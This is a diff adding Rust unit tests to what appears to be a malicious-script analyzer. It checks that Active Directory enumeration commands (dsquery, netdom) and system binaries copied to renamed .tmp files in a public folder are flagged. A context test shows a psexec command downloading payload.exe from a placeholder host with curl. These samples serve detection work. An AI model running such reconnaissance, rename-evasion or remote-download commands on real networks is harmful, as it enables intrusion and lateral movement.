@@ -3929,6 +3929,75 @@ C:\Users\Public\nl.tmp /domain_trusts
     }
 
     #[test]
+    fn domain_directory_tools_emit_enumeration_traits() {
+        let report = analyze(
+            br#"dsquery user -limit 0
+netdom query dc
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "dsquery" && command == "dsquery user -limit 0"
+            )),
+            "dsquery enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "netdom-query" && command == "netdom query dc"
+            )),
+            "netdom query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_domain_directory_tool_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\dsquery.exe C:\Users\Public\dq.tmp
+C:\Users\Public\dq.tmp computer
+copy C:\Windows\System32\netdom.exe C:\Users\Public\nd.tmp
+C:\Users\Public\nd.tmp query pdc
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r#"C:\Users\Public\dq.tmp"#, r#"C:\Users\Public\nd.tmp"#] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied domain directory alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "dsquery" && command == "dsquery.exe computer"
+            )),
+            "copied dsquery enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "netdom-query" && command == "netdom.exe query pdc"
+            )),
+            "copied netdom query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
